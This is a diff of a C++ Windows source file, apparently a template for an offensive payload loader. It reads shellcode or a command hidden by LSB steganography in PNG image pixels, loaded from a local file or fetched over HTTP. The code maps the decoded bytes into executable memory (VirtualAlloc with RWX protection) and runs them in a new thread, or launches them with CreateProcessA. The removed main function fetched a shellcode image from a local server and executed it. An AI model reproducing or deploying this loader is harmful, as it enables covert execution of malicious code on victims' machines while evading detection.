@@ -1,28 +1,101 @@
+#pragma once
+#define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <gdiplus.h>
-#include <winhttp.h>
-#include <string>
+
 #pragma comment(lib,"gdiplus.lib")
-#pragma comment(lib, "winhttp.lib")
 
 using namespace Gdiplus;
 
-
-char get_lsb(char target, char source) {
-    return (target << 1) | (source & 1);
-}
-
+#define payload_type_shellcode 1
+#define payload_type_cmd 2
+#define PAYLOAD_TYPE payload_type_{{ payload_type }}
 
 
-const int shellcode_len = 2208;
+#define PAYLOAD_BITS  {{ PAYLOAD_BITS }};
+
+#define delivery_method_remote 1
+#define delivery_method_local 2
+
+#define DELIVERY_METHOD delivery_method_{{ delivery_method }}
+
+
+#define payload_algorithm_lsb 1
+#define payload_algorithm_lsb_x 2
+
+#define PAYLOAD_ALGORITHM payload_algorithm_{{ payload_algorithm }}
+
+// For testing
+//#define PAYLOAD_TYPE 1
+//#define PAYLOAD_BITS 46064
+//#define DELIVERY_METHOD 2
+//#define PAYLOAD_ALGORITHM 1
+
+
+
+
+const int shellcode_len = PAYLOAD_BITS;
 char* payload_data = new char[shellcode_len / 8];
 
+
+
+
+
+#if PAYLOAD_TYPE == payload_type_shellcode
+void run() {
+    //LPVOID heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
+    //LPVOID ptr = HeapAlloc(heap, 0, shellcode_len / 8);
+
+    LPVOID ptr = VirtualAlloc(0, (shellcode_len / 8), 0x3000, 0x40);
+    RtlMoveMemory(ptr, payload_data, shellcode_len / 8);
+
+
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);
+    Sleep(2000);
+}
+#endif
+
+
+#if PAYLOAD_TYPE == payload_type_cmd
+void run() {
+    STARTUPINFOA si;
+    ZeroMemory(&si, sizeof(STARTUPINFOA));
+    PROCESS_INFORMATION pi;
+
+    CreateProcessA(
+        NULL,
+        payload_data,
+        NULL,
+        NULL,
+        FALSE,
+        NULL,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    );
+    Sleep(3000);
+    }
+#endif
+
+
+
+
+
+
+
+#if DELIVERY_METHOD == delivery_method_remote 
+
+#pragma comment(lib, "winhttp.lib")
+
+#include <winhttp.h>
+#include <string>
 
 
 std::wstring parse_url(std::wstring* url, wchar_t delim) {
     int pos = url->find_last_of(delim);
     std::wstring res = url->substr(pos + 1, std::wstring::npos);
-    
+
     *url = url->substr(0, pos);
 
     return res;
@@ -122,6 +195,26 @@ Gdiplus::Bitmap* load_image(std::wstring url) {
     return bmp;
 }
 
+#endif 
+
+
+
+#if DELIVERY_METHOD == delivery_method_local 
+
+Gdiplus::Bitmap* load_image(LPCWSTR filename) {
+    // load image
+    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromFile(filename);
+    return bmp;
+}
+#endif 
+
+
+
+#if PAYLOAD_ALGORITHM == payload_algorithm_lsb
+char get_lsb(char target, char source) {
+    return (target << 1) | (source & 1);
+}
+
 void read_image(Gdiplus::Bitmap* bmp) {
     Color c;
     char channels[3];
@@ -131,15 +224,16 @@ void read_image(Gdiplus::Bitmap* bmp) {
 
     for (int i = 0; i < bmp->GetHeight(); i++) {
         for (int j = 0; j < bmp->GetWidth(); j++) {
-            
+
             bmp->GetPixel(j, i, &c);
-            
+
             channels[0] = c.GetR();
             channels[1] = c.GetG();
             channels[2] = c.GetB();
 
             for (int k = 0; k < 3; k++) {
                 if (length <= 0) {
+                    payload_data[pos / 8] = 0;
                     return;
                 }
 
@@ -150,32 +244,7 @@ void read_image(Gdiplus::Bitmap* bmp) {
         }
     }
 }
-
-void run() {
-    //LPVOID heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
-    //LPVOID ptr = HeapAlloc(heap, 0, shellcode_len / 8);
-
-    LPVOID ptr = VirtualAlloc(0, (shellcode_len / 8), 0x3000, 0x40);
-    RtlMoveMemory(ptr, payload_data, shellcode_len / 8);
+#endif
 
 
-    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);
-    Sleep(2000);
-}
 
-
-int main() {
-    // Init Gdiplus
-    GdiplusStartupInput gdiplusStartupInput;
-    ULONG_PTR gdiplusToken;
-    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
-
-
-    Gdiplus::Bitmap* bmp = load_image(L"http://127.0.0.1:8080/shellcode_x86.png");
-    read_image(bmp);
-    run();
-
-    GdiplusShutdown(gdiplusToken);
-
-    return 0;
-}
